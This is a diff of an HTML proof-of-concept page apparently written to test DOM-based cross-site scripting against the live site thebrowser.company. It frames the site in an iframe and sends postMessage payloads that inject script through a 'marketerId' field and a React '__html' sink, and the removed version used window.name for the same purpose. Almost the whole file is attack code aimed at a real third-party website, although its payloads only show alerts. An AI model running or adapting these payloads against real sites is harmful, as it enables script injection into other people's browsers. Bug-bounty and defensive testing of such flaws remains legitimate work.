@@ -2,45 +2,44 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>💥 Final DOM XSS PoC – thebrowser.company</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 1rem; }
-    iframe { width: 100%; height: 600px; border: 2px solid lime; margin-top: 1rem; }
-  </style>
+  <title>🔥 DOM XSS Final Chain – thebrowser.company</title>
 </head>
 <body>
+  <h2>🚀 DOM XSS PoC – marketerId + __html Chain</h2>
+  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border: 2px solid lime;"></iframe>
 
-<h2>✅ Final DOM XSS PoC</h2>
-<div>💣 Testing window.name + postMessage injection into dangerouslySetInnerHTML</div>
+  <script>
+    const iframe = document.getElementById("target");
 
-<iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
 
-<script>
-  const iframe = document.getElementById("target");
+      // Payload 1: marketerId sink
+      const marketerPayload = {
+        message: "OB_SHOULD_SHOW_PICKER",
+        content: {
+          marketerId: [
+            `<img src=x onerror=alert('🔥 XSS via marketerId')>`
+          ]
+        }
+      };
 
-  // Payload JSON string with __html sink
-  const payload = {
-    props: {
-      __html: "<script>alert('🔥 DOM XSS Executed')</script>"
-    }
-  };
+      // Payload 2: React dangerouslySetInnerHTML via __html
+      const reactPropsPayload = {
+        props: {
+          __html: `<script>alert('🔥 XSS via props.__html')</script>`
+        }
+      };
 
-  const payloadString = JSON.stringify(payload);
+      // Send both
+      iframe.contentWindow.postMessage(marketerPayload, "*");
+      console.log("📨 marketerId XSS payload sent");
 
-  iframe.onload = () => {
-    console.log("✅ iframe loaded");
-
-    // Set window.name with JSON
-    iframe.contentWindow.name = payloadString;
-    console.log("📦 window.name set with payload");
-
-    // Send the same payload via postMessage
-    setTimeout(() => {
-      iframe.contentWindow.postMessage(payload, "*");
-      console.log("🚀 Payload sent via postMessage");
-    }, 1000);
-  };
-</script>
-
+      setTimeout(() => {
+        iframe.contentWindow.postMessage(reactPropsPayload, "*");
+        console.log("📨 React props.__html XSS payload sent");
+      }, 1500);
+    };
+  </script>
 </body>
 </html>
